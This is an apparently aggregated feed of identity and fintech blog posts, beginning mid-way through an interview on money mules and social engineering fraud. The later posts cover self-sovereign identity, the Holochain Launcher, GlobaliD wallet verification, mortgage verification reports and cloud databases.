<p>Philomena: We recently detected a ‘Money Mule’ pattern originating from the Philippines. At first glance, it looked like an organised criminal activity where users were intentionally cooperating with the fraudsters. By coincidence, we had this rare opportunity to correspond with some people taking part in the scam. After analysing the situation and with the cooperation of the individuals involved, we concluded with high confidence that the users were, in fact, victims of a ‘social engineering’ attack.</p>
<p>Each of the victims was forced to take a loan and got tricked by a shady credit advertisement posted on Facebook. These users were entirely unaware that their actions may bring any penalties to them. We have learned that each case can have a “hidden agenda” that is usually not visible to fraud analysts.</p>
 What are the motives of those involved? 
<p>Michał: Again, we have to distinguish. With what we identify as ‘Money Mules’, we assume a criminal background and an eagerness to make easy money.</p>
<p>Poverty plays a huge role as well, as it can lead to criminal activities. If individuals are desperate or hopeless, they may feel they have no other choice.</p>
 How are ‘Money Mules’ recruited? 
<p>Philomena: Quite often, ‘Money Mules’ are recruited through social media channels. Even if these posts are discovered and taken down by regulatory authorities, it is easy for criminals to re-post scam advertisements. We regularly reach out to hosts (website providers) and make them aware of who is using their services.</p>
<p>Michał: We also see a combination of data leaks and fraudsters. Victims are contacted by a scammer via WhatsApp and get trapped in a social engineering scenario. The approached person might not actively look for any source of income/cooperation but when they receive a random message from an unknown person, somehow it opens an unexpected opportunity to them.</p>
<p>Philomena: From our experience we can, unfortunately, say that&nbsp;it is typically shady trading and investment companies that are constantly looking for victims who would like to taste a “businessman” life.</p>
 What are the consequences for ‘Money Mules’ who have been identified? 
<p>Philomena: Firstly, often all their bank accounts (both accounts with fraudulent and non-fraudulent purposes) get closed or the money is frozen. After getting caught doing these criminal activities, individuals also find it difficult to get credit for things like phone contracts, student loans, and applying for credit in the future. Furthermore, it is also not uncommon to be condemned – individuals can be imprisoned for up to 14 years.</p>
<p>Such activity leaves a mark on the person’s criminal record which brings other consequences – it may also make it challenging to find a job, especially if it is one involving data protection. It is important to highlight this, especially as nowadays, almost every position has something to do with data protection, for example, payments.</p>
 Now that we discussed the subject of ‘Money Mules’, let’s drill further into the phenomenon of ‘Social Engineering’. You already mentioned it, but could you repeat to us, how is this different to ‘Money Mules’? 
<p>Michał: Internally we differentiate them as follows, nevertheless most institutions do not separate between ‘Money Mules’ and ‘Social Engineering’.</p>
<p>Victims of social engineering are not aware that their actions may have legal consequences. The scammer uses psychological manipulation to lure an innocent person into the trap. Usually, they are strongly convinced that they are working as an app tester or a financial clerk.</p>
<p>Furthermore, the tasks given to the victims are designed and described in a way not to draw victims attention. The criminal often provides a fancy job contract, which looks like the actual work arrangement at first glance. Other examples involve applying for a loan. The users are then convinced that the credit can be only issued under specific conditions, which usually contains opening an account with a financial institution and later passing the credentials to the fraudsters.</p>
<p>As a result, the criminal gains access to the freshly created bank account, which may result in further financial malversations in the victim’s name. The scammer will therefore remain undetected, and the whole liability will be passed to the unaware person.</p>
<p>In the case of ‘Money Mules’, the person is willingly cooperating with the criminal. In most scenarios, they are involved in money laundry processes as well and can gain credits for fulfilling different tasks.</p>
 How do victims get involved with ‘Social Engineering’? 
<p>Philomena: Usually, victims fall easily for fake jobs and loan advertisements on social media. In addition, most persons involved in ‘Social Engineering” are very eager to invest their money and are okay with working with a trading company which doesn’t’ necessarily have a good reputation. This is another version of the “boiler room”: The victim receives an “excellent investment offer” that they cannot reject.</p>
<p>Michał: More recently, we came across the so-called ‘Corona Fraud”. Users received a message stating that due to the corona regulation, they are required to register their profile on the specific portal. Naturally, the person then follows these instructions and provides all sensitive data and most likely identify himself/herself for a financial service.</p>
<p>The ‘Corona Fraud’ also occurs on Dating apps when a newly contacted person out of the sudden needs financial help. Also, there is what we call the ‘Inheritance Fraud’. To receive a very attractive sum of money, the victim must open a bank account and perform few money transfers or even provide the scammer with the credentials.</p>
 What are the consequences for the victims? 
<p>Philomena:&nbsp;&nbsp;Fraudsters usually take over the victims’ account and sell the details online, rather on the dark web. Furthermore, usually at this point the victim appears as an easily accessible person (since their data was misused) and attracts other fraudsters. In the following, the victim’s documents/identity are often used for further manipulation and money laundry.</p>
<p>Michał:&nbsp;As for the legal side, there are no legal penalties for being a victim of social engineering. However, the person involved in the fraud might be prevented from leaving their country until the case has been solved. There is also the risk of the person getting a criminal record if the case is not handled correctly and the victim may have to take full liability for the financial losses. It can be a highly time-consuming process to accomplish all the bureaucracy formalities before being actually “free.” Ultimately, the victim might also end with a huge debt and bad credit with credit card institutions.</p>
 Final question: What is – so to speak – the breeding ground for criminal activities such as ‘Money Mules’ or ‘Social Engineering’? What can users on the internet, but also companies, do to put a stop to this? 
<p>Michał:&nbsp;The fundamental problem is that the fraudsters often exploit the victims’ human vulnerabilities. This involves, for example, the financial hardship or interpersonal relationships (for example love relationships) of the victims. The fraudsters often know very well what their victims desire and act accordingly. The scammers work with the victims’ fears and weaknesses.</p>
<p>In situations of need, many people are often more susceptible, so the scammers have an easy target. Also, fake websites, for example, are becoming better and harder for an untrained eye to spot.</p>
<p>Philomena:&nbsp;&nbsp;At this point, I would also like to refer you to the information provided by <a href="https://www.europol.europa.eu/activities-services/public-awareness-and-prevention-guides/money-muling">Europol</a>, which summarizes very effective preventive measures. To put it in my own words, Europol recommends the following actions to users on the Internet:</p>
 
 Never give your bank account or any other personal details to anyone unless you know and trust them. 
 Secure your bank cards. Do not disclose your online banking login details, PIN, CVV number, etc. 
 Be very cautious of unsolicited emails or offers made over social media or in person, promising easy money. 
 Ignore any job offer involving money transfers through your bank account, regardless of how authentic they may seem. If an opportunity sounds too good to be true, it probably is. 
 If you have received emails of this type, do not respond to them, and do not click on any links they contain. Inform the police instead. 
 Stay alert for job ads and social media posts that promise easy money. Always report the account to the platform provider in order to be taken down and prevent other people from falling for the scam. 
 If you happen to receive an offer in person, decline it and report it to the police. 
 If you suspect that you are caught up in a ‘Money Mule’ or money laundering scheme, stop transferring money immediately, notify your bank or payment provider, and report it to your national police. You could help prevent other people from becoming money mules and even help catch the criminals. 
 
<p>Michał: I’d like to stress the fact that IDnow takes criminal activity / fraud very seriously and this is the reason why we have a dedicated team who is constantly working to prevent these types of frauds.

<p>The recent EU announcement about having a <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">digital wallet</a> for all its citizens has given fresh impetus to the world of decentralization and <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity</a>&nbsp;(SSI).</p><p>In this context, we caught up with <a href="https://www.linkedin.com/in/adrian-doerk/?originalSubdomain=de">Adrian Doerk</a> (popularly known as the <a href="https://ssi-ambassador.medium.com/">SSI Ambassador</a>), the Product Manager and Marketing Lead of Lissi, and the Communication and Public Relations Head at IDunion. This multifaceted personality who owns many hats, talks about the future of SSI, with a focus on the&nbsp;EU.</p><p>Here are some excerpts from this interview.</p> Is SSI going to be big in the coming years? If yes,&nbsp;why? <p>There is a big need for solutions to enable trusted interactions, especially when it comes to identification and authentication. It all stems from the fact that the <a href="https://academy.affinidi.com/web-2-0-vs-web-3-0-a-bridge-between-the-past-and-the-future-c99668c1e2f0">Internet</a> was never designed for identities of individuals in the first place. Though we have standards and protocols for transactions, these are not constructed to enable the average user control of his or her digital identity without depending on a single third&nbsp;party.</p><p>Even with the existing standards and technologies, there are limits. This is most evident from the countless cyberattacks that happen so&nbsp;often.</p><p>Hence, there is a need for trusted interactions. In particular institutions, the government, and public stakeholders believe these trusted interactions are crucial for a functioning society.</p><p>At the heart of it all is an innate need to safely identify and authenticate oneself in the online world. As of now, this need has not been&nbsp;met.</p><p>SSI can fulfill these requirements as it supports the safe and trusted issuance and presentation of credentials among different entities, and this is why <a href="https://academy.affinidi.com/impact-of-self-sovereign-identity-in-real-estate-11456c4b1faa">SSI</a> can be big in the coming&nbsp;years.</p> Are we ready as a society to embrace SSI, in terms of the necessary technologies and infrastructure? <p>Yes and&nbsp;no!</p><p>We’re ready in terms of baseline infrastructure, but when it comes to the nitty-gritty non-technical details such as liabilities and governance, we still have a long way to&nbsp;go.</p><p>As far as the technical infrastructure goes, yes we are right on track to move forward. Though there are some technical aspects that we need to address for <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">SSI</a> to become more widespread.</p> Europe is one of the frontrunners in the SSI space, especially after the digital wallet announcement. How will it impact life in&nbsp;Europe? <p>It will take some time for this regulation to come into effect and we will know more about the specifications for the identity wallet in the next few months or so. Undoubtedly, it is ambitious and can have a far-reaching impact.</p> What will be the accelerator(s) for&nbsp;SSI? <p>It needs to be a combination of government legislation, ecosystem, and startups in the SSI space. All these stakeholders are key for the acceleration of the ecosystem.</p><p>You obviously need the government’s support as nothing moves without it. Community is also very important for sharing <a href="https://academy.affinidi.com/solving-the-principal-agent-problem-proxy-issuance-with-verifiable-credentials-c8f97ee9ee9b">problems</a> and <a href="https://academy.affinidi.com/25-real-world-use-cases-of-verifiable-credentials-4657c9cbc5e">use-cases</a> and eventually, using them to create an ecosystem.</p><p>So, all the stakeholders must come together to serve the community backed by the government’s support in terms of funding and legislation.</p> If you have to pick one accelerator, what would be right at the top of your&nbsp;list? <p>The ecosystem.</p> What, according to you, is the best way to store and manage verifiable credentials? <p>Storing verifiable credentials on the <a href="https://academy.affinidi.com/do-you-need-blockchain-for-enabling-ssi-452d62b34890">blockchain</a> is a terrible idea, so I hope nobody even thinks of&nbsp;it!</p><p>A <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">wallet</a> provides a user interface and helps users to manage keys and use them for interacting with other parties. Currently, wallets work well on mobile devices, which means data is stored locally on smartphones.</p><p>But at some point, we need to move to desktop devices and browsers, and this would necessitate developers and companies to start thinking about where the data should be stored. Again, this would be a wallet-specific implementation that would depend to a large extent on the use-case and the expectations and actions of&nbsp;users.</p><p>For example, a tech-savvy user might want to decide whether he/she wants to store the data on the mobile device or on any other device owned by the user. However, it can also be stored in encrypted storage on the&nbsp;cloud.</p><p>On the other hand, some users might not care so much about where it is stored as long as they can share it in a safe and secure way. Such users may opt for a wallet service, which is fine too because not everyone is tech-savvy enough to choose their place of storage and ensure a high availability of a local&nbsp;backup.</p><p>In all, we need different solutions for different people to store and manage <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">verifiable credentials</a>.</p> As a startup in Europe, what are some things that you’d do in the next two&nbsp;years? <p>It depends on the product and the current state of the company. I would help companies and partners to understand what we are building, so they can offer it to their end customers in such a way that it benefits them greatly. At the same time, every stakeholder must understand what the technology is about and why they should use&nbsp;it.</p><p>This is easier said than done because <a href="https://academy.affinidi.com/compare-and-contrast-federated-identity-vs-self-sovereign-identity-227a85cbab18">SSI</a> is a complex technology. So, my focus would be on helping companies to create SSI-based solutions and do everything they can to disseminate information about this technology in a way that everyone can understand.</p> This leads to the next question — What would you do to Create Awareness on&nbsp;SSI? <p>A good way is to use content to explain complex technologies with concepts people are familiar with. In particular, this approach can help people who are new to this industry to get a hang of SSI and the principles and components that drive&nbsp;it.</p> With all these coming together, what changes do you anticipate in the next 3–5&nbsp;years? <p>To be honest, not a whole lot. I don’t foresee a huge societal shift and definitely nothing as impactful as say, the introduction of smartphones.</p><p>What will change is that there will be a greater need to control identities and manage them, and this should make it easy for organizations to offer the concept of SSI to the general&nbsp;public.</p><p>With a growing availability of use cases from different verticals we will see an increased usage of it in the daily life of average people. However, while the public might like the new way of interacting with third parties on the internet a lot of people probably rather say: “That was long overdue” instead of “This will change everything”.</p><p>We signed off on this&nbsp;note!</p><p>We hope that was an interesting read for you and follow us on <a href="https://www.linkedin.com/company/affinidi/">LinkedIn</a>, <a href="https://www.facebook.com/affinidi.devs">Facebook</a>, or <a href="https://twitter.com/affinidi">Twitter</a> for many such interesting insights.

<p>This week brings two big updates:</p>  One for everyone — the Holochain Launcher  One for developers — a scheduler in Holochain v0.0.108   Holochain Launcher preview: user-friendly hApps <p>I hinted at the <a href="https://github.com/holochain/launcher">Holochain Launcher</a> in the <a href="https://blog.holochain.org/holochain-v0-0-107-a-release-to-build-on/#holochain-v0-0-107-changelog">last</a> <a href="https://blog.holochain.org/dev-camp-8-starts-in-two-weeks/#dev-camp-8-huge-turnout-exciting-curriculum">two</a> Dev Pulses, but didn’t go deep into it. So what is it?</p><p>Simply: the Launcher finally makes it easy for non-developers to install and use hApps. On their own devices. Without a computer science degree. Now, all you need to do is <a href="https://github.com/holochain/launcher/releases">download an installer</a> for your OS (Windows, macOS, and Linux are all supported), and it’ll install the Holochain conductor and a basic but user-friendly admin UI. Once you’ve got the Launcher installed, running a new hApp should be as simple as downloading a package and installing it in the Launcher.</p><p>This means that, as a developer, there’s a way to get your hApps into your users’ hands without much fuss. That’s pretty big news! It’s still very new, not yet production-ready, so the devs are asking for feedback — you can report an issue on <a href="https://github.com/holochain/launcher/issues">GitHub</a> or directly from the Launcher’s menu.</p><p>The Dev Camp participants are beginning to battle-test the Launcher, which has already resulted in a few bug fixes and improvements.</p><p>For an alternative approach, I’ve shared before that the folks at Sprillow have created tools that let you embed Holochain into a <a href="https://github.com/Sprillow/embedded-holochain-runner">Rust</a> or <a href="https://github.com/Sprillow/electron-holochain">Electron</a> application. These tools are being used in the desktop version of their <a href="https://github.com/h-be/acorn">Acorn goal-planning app</a>.</p> Try a peer-to-peer application now!   Find a few friends to test the app with.  <a href="https://github.com/holochain/launcher/releases">Download the Launcher</a>.  Install the Launcher.  Download a web hApp, either <a href="https://github.com/eyss/elemental-chess/releases/tag/v0.1.1">Elemental Chess</a> or <a href="https://github.com/holochain/elemental-chat-ui/releases/tag/v0.0.1-alpha37">Elemental Chat</a> (look for the <code>.webhapp</code> file in the downloads section).  Open the launcher and look for the big blue ‘Install new app’ button.  Select the web hApp you just downloaded.  A dialog will pop up. Leave the app ID field unchanged, leave the membrane proof field blank, and choose a word or a string of random characters for the UID field. You and your friends should all enter the same UID — this ‘<a href="https://developer.holochain.org/concepts/2_application_architecture/#dna">clones</a>’ the hApp’s DNAs, giving your group its own private DHT.  After clicking the ‘Install app’ button, you should see your new hApp listed in the main admin window. Click the ‘Open’ button and the hApp’s UI will open in your web browser!   Make your hApp compatible with the Launcher <p>If you’re a hApp developer, it’s pretty simple to build a Launcher-ready hApp. It consists of a hApp (a collection of DNA files) and an archive of static web assets that you bundle together with the <code>hc</code> dev tool. The Launcher has an internal web server listening on localhost that serves those static web assets to your user’s browser. Read the <a href="https://github.com/holochain/launcher#packaging-a-web-happ">readme</a> for full instructions.</p> Holochain v0.0.108 introduces a scheduler <p>Sometimes a hApp will want to do something in the background without user interaction. You can always do this behind the scenes in your UI’s code, but what if the UI is closed and this background task is important to how the hApp works?</p><p>The most recent Holochain release brings a host function called <a href="https://docs.rs/hdk/0.0.108/hdk/time/fn.schedule.html"><code>schedule</code></a>. I’ve written a page on the community wiki that <a href="https://github.com/holochain-open-dev/wiki/wiki/How-to-use-the-scheduler-in-your-zome">explains how it works</a>; check it out if you need something like this in your hApp.</p> Holochain In Action: Introducing the Launcher <p>This week’s Holochain In Action session gives a demo of the Holochain Launcher with two hApps: Elemental Chat and Elemental Chess. It also gets into Holochain networking, particularly what the bootstrap and proxy services are for, and finishes with some of the technologies the Launcher was built with.</p><p>Cover photo by <a href="https://unsplash.com/@spacex?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">SpaceX</a> on <a href="https://unsplash.com/s/photos/rocket-launch?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

   Back in June, XRPL Labs integrated its XUMM Wallet with GlobaliD’s self-sovereign identity platform as part of an ongoing initiative to improve XRP Ledger account trustworthiness.  With GlobaliD, XUMM wallet users are able to link their GlobaliD public profile and have their government IDs attested in order to verify their XRPL accounts.

<p>Back in June, XRPL Labs<a href="https://twitter.com/XRPLLabs/status/1410301187765723139"> integrated its XUMM Wallet with GlobaliD’s self-sovereign identity platform</a> as part of an ongoing initiative to improve XRP Ledger account trustworthiness.</p><p>With GlobaliD, XUMM wallet users are able to link their GlobaliD public profile and have their government IDs attested in order to verify their XRPL accounts. GlobaliD users can now also acquire attestations for their XRPL accounts.</p><p>It’s a pretty big deal. <a href="https://xrpl-labs.com/">XRPL Labs</a> is a startup based in the Netherlands and Estonia focused on developing software for the XRP Ledger that counts <a href="https://ripple.com/">Ripple</a> as an investor. Their <a href="https://xumm.app/">XUMM Wallet</a> offering is the leading noncustodial wallet for accessing the XRP ecosystem with over 200,000 active users and a vibrant developer ecosystem.</p>  <a href="https://twitter.com/XRPLLabs/status/1410301192702410757">How to verify your XUMM Wallet with&nbsp;GlobaliD</a>  <p>A noncustodial wallet is a type of crypto wallet where users have personal custody of their assets. Think of it as having cash in your wallet. The money is yours and you have total control over it when it comes to receiving cash or making payments.</p><p>Contrast that to a custodial wallet that you might have with a service such as Coinbase or Uphold. This is more analogous to a bank account, where the service provider has custody over your assets. You can still receive and make payments as you’d like, but now you’re relying on a central operator to hold onto and make available your assets when necessary.</p><p>These platforms are convenient for users as they can rely on the trust and security of the service provider. Companies like Coinbase and Uphold have stringent KYC/AML (Know Your Customer and Anti-Money Laundering) processes to comply with relevant regulations and to ensure safety for their&nbsp;users.</p><p>With a noncustodial wallet, the onus of trust and security falls on the user. As we like to say at GlobaliD, your sovereign digital identity is a right — but it’s also a responsibility.</p><p>It’s also why GlobaliD’s partnership with XRPL Labs makes so much sense. By integrating GlobaliD, XUMM Wallet users are able to link their digital identity to their wallet, enhancing trust across the ecosystem. By verifying their digital identities, users can know whether or not they’re dealing with the right&nbsp;person.</p><p>That choice, of course, is also up to each individual user as this is an entirely opt-in feature. Users who have completed their ID attestation receive a blue checkmark next to their name, signaling to others that they’ve completed the process. Aside from their name, profile photo, and checkmark, no other information is made&nbsp;public.</p><p>Users who wish to maintain full privacy while still enhancing trust are able to have their ID attested without sharing their name or photo and still get ablue checkmark.</p><p>Whenever it comes to trust, there are always trade offs with privacy and anonymity. With GlobaliD’s self-sovereign framework, you essentially get the best of both worlds. You maintain ownership and control over your identity and your data. And only you decide what you’d like to share. Neither GlobaliD nor XRPL Labs has access to your personal information.</p><p>Thus far, 1463 users have acquired blue checkmarks by linking their GlobaliD identity to their XUMM Wallet, and according to XRPL Labs founder Wietse Wind, the feedback has been resoundingly positive:</p><blockquote>“On the XRP Ledger, accounts (non-custodial wallets) are much like an online identity. While they can be anonymous, many use cases, businesses and other users benefit when users can demonstrate that their blockchain accounts (accounts on the XRP Ledger) can be&nbsp;trusted.</blockquote><blockquote>We’re seeing a clear shift in the XRP Ledger ecosystem among end users — a preference for a more personal user experience, increased trust when sending tokens, and vigilance when it comes to accepting issued tokens versus a completely anonymous situation.</blockquote><blockquote>An integration between GlobaliD and XUMM has been requested and suggested by end users in the past. Now, the integration is live — and with compliance and privacy becoming increasingly important topics for the entire ecosystem, we invite all XUMM users to get their “blue checkmark” for their XRP Ledger account by leveraging the GlobaliD + XUMM integration.”</blockquote><p>More than trust, it’s also about fun. (Or rather, maybe we tend to have more fun when we can trust each other.) One new feature is a public Tip Bot. By integrating GlobaliD, users are able to know who they’re tipping as well as to see who’s tipping them if everyone is opted&nbsp;in.</p><p>All of this, however, is just the beginning. Stay tuned for more exciting updates from GlobaliD x XRPL&nbsp;Labs!</p><p>Want to learn more?

<p>CoinPost: HotCity is one of the Ardor blockchain use cases in which a gamification-based reward model has been implemented and tested to address environmental issues and achieve sustainability. The aim is to crowdsource data of industrial and commercial waste heat in urban planning as potential renewable energy sources. In order for citizens to participate voluntarily and enjoyably, digital points, issued as tokens on the Ignis child chain, are distributed as rewards for providing that information, that can be redeem as vouchers for goods and services by partner companies.</p>

In this week’s State of Identity podcast, host, Cameron D’Ambrosi is joined by Shaun Strydom, Founder, Executive Head, and Identity Futurologist at Contactable to discuss the race for digital identity orchestration and federation. They go beyond the bells and whistles of biometrics and verification solutions and reveal how fully orchestrated onboarding solves for organizational complexities when servicing customer journeys digitally.     &nbsp;

   Even though passwords can be compromised easily and are generally considered unsafe, they are still ubiquitous in a time when multi-factor authentication and biometrics are easily available.

 Musicians Get Bypassed, Again <p>Universal Music, the largest of the three big music labels, went public last week. The valuation was something on the order of $53 billion, and this is another chapter of the story where profits from artists get paid out to corporations and shareholders rather than the creators themselves.</p><p>This IPO is about the past, though, not about the future. The vast majority of the music managed by the large labels is legacy catalogs now. And the majority of new music is not going into this old system. Still, the legacy catalogs continue to generate incredible revenue and profit for the labels, not necessarily the artists or even the publishers because of the way deals were negotiated for streaming. A few years back the <a href="https://www.digitalmusicnews.com/2015/05/22/fk-it-heres-the-entire-spotifysony-music-contract/">contract</a> between <a href="https://www.theverge.com/2015/5/19/8621581/sony-music-spotify-contract">Spotify and Sony was made public</a>, and it demonstrated that, despite all the laws in place to protect publishers and artists, agreements can be written to bolster the profits of labels instead. By specifically avoiding the language of royalties and instead paying as much as $42 million over three years in ‘advances’, they sidestepped the need to actually pay the artists.</p> How Musicians Make a Living, Today <p>But if you talk to many artists these days, they will tell you that the way they make a living is no longer based simply on selling their music. Some offer it up for free. Many do have it on the streaming services and receive some payment for it. But many artists have found their bread and butter to be performing and giving fans intimate access to their creative processes. This new form of engagement or interaction was first seen in some of the centralised platforms for musicians. Starting as far back as MySpace and then Bandcamp and other services, artists began having more direct interaction with their fans online. This took a leap with interactive live streams during the lockdowns when in person events were essentially cancelled making earning a living excruciatingly difficult for performers.</p> The Challenges of Music 3.0 <p>There’s been an uptick in music projects on blockchain. While it’s exciting to see new energy in the music tech space that is currently not reliant on the legacy music labels, these solutions have inherent limitations if the focus is streaming, because music consumption typically isn’t limited to just the new stuff - a generalised streaming service that cannot offer the catalogs of the label giants is going to have a steep hill to climb in terms of user experience.</p><p>Further, blockchain has inherent limitations and costs. Even with newer sidechain solutions and faster transaction speeds, it just isn’t suitable for the sort of interactive community apps that are needed. Add in the wasted processing and the effects to the environment and it seems like merely a transitional step on the exciting path to tomorrow. So some of the blockchain startups who are not focused on streaming legacy catalogs, like Songcamp or Catalog, may find a friend in Holochain where they can more easily and cost-effectively achieve their goals.</p> John Lennon’s Imagine, Take Two <p>What could be the vision for music in the future? If today’s reality for musicians and performers is that it’s less about music streaming or unit sales and more about fan and listener interaction -- what if that were to snowball? If the mojo between artists and fans today is driven by intimacy and decentralization, the tech that supports their relationship should support that, rather than be at odds with it.</p><p>And what’s beyond that? If the tech enabled intimacy and decentralization, could the relationships become richer and more generative? Could fans become co-creators, remixing artists’ music, boosting the popularity (and revenue) of the original artists while gaining some recognition of their own?</p><p>Imagine platforms where the hosting power required for all of the music sharing and the community interaction is contributed by the community itself. That means essentially zero cost data storage. The more the network grows, the healthier the platform gets. Holochain is peer-to-peer, collaborative-first technology that can support real-time, user-friendly applications — applications that connect artists directly to their supporters.</p><p>Imagine platforms where every artist is recognized and fairly rewarded for their work whether it is streamed or remixed. Suddenly, ‘borrowed riffs’ are tolerated and even encouraged because everyone gets detailed attribution and compensation (when desired) without any middlemen. Holochain provides the cryptographic accountability trails necessary to support this sort of creative explosion.</p><p>Imagine a future of music that belongs not to labels and distributors, but to a thriving network of music creators and lovers. Holochain is where the future of distributed music tech can thrive.</p><p>Holochain is ready now for developers and creator cooperatives to start designing and building.</p><p>Ready to find out more? Then <a href="https://holochain.org/dev-camp">check out the DevCamp</a>, in progress now, where over 1500 people have signed up to learn how to design and build Holochain apps. If you are not a developer, we have alternatives and opportunities for you to engage as well.</p><p>Cover photo by<a href="https://unsplash.com/@anthonydelanoix?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"> Anthony DELANOIX</a> on<a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"> Unsplash</a></p>

<p>While digital experiences are rapidly becoming the norm for mortgage lending, the verification process has largely remained a manual, paper-driven process. Fortunately, this is changing.</p>
<p>Finicity, a Mastercard company, is the only authorized report supplier that offers a digital, single-vendor solution for assets, income, and employment authorized for representation and warranty relief through both Freddie Mac and Fannie Mae. By automating the asset and income verification process, providing transaction data for rent payment history and providing a 10-day pre-closing report, we can help you streamline the approval process and in turn even be a more inclusive lender.</p>
 Approved by Freddie Mac and Fannie Mae&nbsp; 
<p>Finicity is an authorized supplier for <a href="https://sf.freddiemac.com/tools-learning/loan-advisor/our-solutions/aim-asset-income-modeler">Freddie Mac’s Loan Product Advisor® AIM</a>, which automates borrower assets, income, and employment assessment for lenders. By leveraging the expertise of third-party service providers, AIM helps to deliver a simpler, more efficient loan origination process.</p>
<p>Fannie Mae’s Desktop Underwriter® (DU®) validation service also accepts our <a href="https://singlefamily.fanniemae.com/applications-technology/desktop-underwriter-validation-service/du-validation-service-verification-report-vendors">mortgage verification services</a> to independently validate borrower assets, income, and employment data—providing<a href="https://singlefamily.fanniemae.com/applications-technology/day-1-certainty"> Day 1 Certainty®</a> on validated loan components. By digitally validating secure third-party data through DU, you can help eliminate the paper chase and help get your borrowers approved quicker.</p>
 Rent payment history in credit decisioning 
<p>On September 18, Fannie Mae introduced the inclusion of rent payments in their automated mortgage credit decisioning process in DU. Fannie Mae identifies recurring rent payments in bank statements and transaction data as a factor which could deliver a more <a href="https://www.fanniemae.com/research-and-insights/perspectives/helping-renters-unlock-door-homeownership">inclusive credit assessment</a>.&nbsp;</p>
<p>For first-time homebuyers who may have a limited credit history but a strong rent payment history, the enhancement creates new opportunities for homeownership while still promoting safe lending. Fannie Mae <a href="https://www.fanniemae.com/newsroom/fannie-mae-news/fannie-mae-introduces-new-underwriting-innovation-help-more-renters-become-homeowners">said 17% of applicants</a> who have not owned a home in the last three years and who did not receive a favorable mortgage recommendation could have instead received an “approved” or “eligible” recommendation if their rental payment history had been considered.</p>
<p>To take advantage of the rent payment history feature, Finicity provides a <a href="https://docs.finicity.com/finicity-lend-reports/#finicity-lend-report-list-7">Verification of Asset and Income (VOAI) report</a> through its Mortgage Verification Service (MVS) that includes up to 24 months of transaction data that Fannie Mae can use to identify rent payment history and provide a more favorable credit assessment.</p>
<p>The VOAI report can be called with a direct API or is available currently in <a href="https://www.icemortgagetechnology.com/">ICE Encompass and Encompass Consumer Connect,</a> as well as the <a href="https://www.simplenexus.com/">SimpleNexus</a> mortgage point-of-sale (POS) platform.&nbsp;</p>
 10-day pre-closing verification 
<p>Additionally, Finicity’s 10-day pre-closing reports provide just the right data GSEs need for 10-day verification of employment.</p>
<p>In adding a 10-day pre-closing report to our mortgage verification services, we have enabled lenders to receive only the data GSEs require for the 10-day verification. You can use these<a href="https://docs.finicity.com/refresh-reports-2/"> 10-day pre-closing reports</a> to view just your borrower’s employment status rather than refreshing our current full reports that contain financial data. This minimizes the introduction of new income data or other redundant and unnecessary underwriting changes.</p>
<p>One of the reports available is the VOE Transactions report, which contains 120 days of refreshed transactions with dates and description but no amounts or totals so that income is not re-assessed. It shows the latest direct deposits in the income streams so that it can be determined that the borrower is still being paid on their regular cadence.</p>
<p>Another option is the VOE Payroll report. This contains only employment status—no income or other data—so lenders can see that the individual is still employed according to their payroll provider.</p>
<p>Our 10-day pre-closing reports are part of MVS at no extra charge and are currently only available for lenders connecting directly to Finicity.</p>
<p>These new reports could help you improve accuracy and simplify the process of verifying employment within ten days of closing, which is simplifying the loan origination process even further without increasing risk. Because these products are part of Finicity MVS, you would no longer have to call your borrower’s employers to get the information or manually ask for any extra interaction from the borrower.</p>
 How can you access these 10-day pre-closing reports? 
<p>To pull the VOE reports today, your team will need to code directly to the endpoints. You can find<a href="https://docs.finicity.com/refresh-reports-2/"> documentation here</a>. As we integrate them further into LOS and POS platforms, they will be even easier for consumer loan officers to access.&nbsp;To see Finicity’s Mortgage Verification Services in action,<a href="https://www.finicity.com/demo/"> request a demo here</a>.</p>

  <p>by <a href="https://www.kuppingercole.com/team/balaganski">Alexei Balaganski</a></p><p>Modern businesses depend on digital information. For quite a few years already, it’s been considered the world’s most valuable commodity, worth more than oil, gold, or even printer ink. Some of the world’s largest companies have turned data into their primary source of income, generating billions in profits every year, but for the rest of us, there is always data that is critical for our business’s success or even basic survival. Information such as intellectual property, customer data, or financial records is rightfully called “crown jewels.”</p>
<p>Unfortunately, as opposed to gold that you can just put into a safe, data only generates value when it’s being actively used - accessed, transformed, visualized, or exchanged with partners – otherwise it only amounts to deadweight with recurring storage costs. Even worse, unless access to the data is properly regulated and secured, it can potentially lead to a data breach and a hefty compliance fine. In other words, it is usually not the data itself, but the underlying data management platform that unlocks the true value of your crown jewels – that is, a database.</p>
<p>There is an ongoing, almost religious debate about the kind of database most suitable for working with different types of data. Should it be a single universal system for handling all your data or should you rather use a combination of specialized engines optimized for, say, financial transactions vs. analytics, full-text search, or time-series data management. Personally, I believe that from the business perspective this dichotomy is completely irrelevant.</p>
<p>For a customer, the ideal database is the one that is essentially invisible, providing all the necessary functions without any overhead of managing the underlying hardware and software infrastructure. The closest thing to this ideal we can get today is a managed database in a cloud platform; these DBaaS solutions are very popular with customers since they come with a promise of fully elastic scalability, high performance, and extremely low maintenance. Since such services are usually based on popular open-source engines improved and managed by cloud service providers, the initial learning curve is also very low.</p>
<p>In reality, however, many companies working with databases in the cloud will eventually face multiple reality checks. First of all, not all data can be moved to the cloud at all, so it becomes necessary to maintain separate database technology stacks in hybrid environments. Secondly, open-source databases running on commodity hardware often do not scale as well as promised, leading to performance issues and other bottlenecks. Finally, when data is sprawled across multiple disparate data sources, running analytics across them becomes increasingly difficult without bringing in yet another specialized database just for this purpose (to say nothing about moving data between databases and the security and compliance implications of such designs).</p>
<p>Does it mean that every company with a cloud-first strategy will face these challenges? Not at all, as many are perfectly happy with their highly distributed and loosely coupled applications. Unfortunately, not all business use cases can be so easily adapted for modern architectures like microservices, and even those that can, will eventually feel the burden of consolidating their data for analytical purposes. Perhaps, at that moment, all they’ll be dreaming about would be an alternate universe where they’ve decided to keep all their data in a single unified database.</p>
